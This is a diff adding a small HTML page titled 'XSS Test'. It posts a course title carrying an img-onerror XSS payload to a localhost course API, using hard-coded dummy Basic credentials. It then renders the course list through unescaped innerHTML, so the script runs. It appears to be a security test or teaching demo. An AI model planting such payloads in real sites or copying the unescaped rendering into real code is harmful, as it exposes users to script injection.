@@ -1,0 +1,75 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="https://classless.de/classless.css">
+    <title>XSS Test</title>
+    <script>
+        const bobCredentials = 'Basic Ym9iQGV4YW1wbGUuY29tOnBhc3N3b3Jk';
+
+        async function getCourses() {
+            const response = await fetch('http://localhost:8081/courses',
+                {
+                    headers: {
+                        "Authorization": bobCredentials
+                    }
+                })
+            console.log(response)
+
+            const courses = await response.json();
+            const coursesContainer = document.getElementById("courses-container");
+
+            const courseList = courses
+                .map(c => `
+                <tr>
+                    <td>${c.id}</td>
+                    <td>${c.title}</td>
+                </tr>`)
+                .join("\n");
+
+            coursesContainer.innerHTML = courseList;
+        }
+
+        async function postCourse() {
+            const response = await fetch('http://localhost:8081/courses',
+                {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        title: "<img src=\"nope.png\" onerror=\"alert('pwned')\"/>"
+                    }),
+                    headers: {
+                        "Authorization": bobCredentials,
+                        "Content-Type": "application/json"
+                    }
+                }
+            )
+            console.log(response)
+        }
+
+        async function init() {
+            await postCourse(); // Only first request gets executed because the CORS response is cached for 1 hour
+            await getCourses();
+        }
+
+        init()
+    </script>
+</head>
+<body>
+<div class="card hint">
+    <p>Courses</p>
+    <table>
+        <thead>
+        <tr>
+            <th>Course Id</th>
+            <th>Course Title</th>
+        </tr>
+        </thead>
+        <tbody id="courses-container">
+        </tbody>
+    </table>
+</div>
+</body>
+</html>
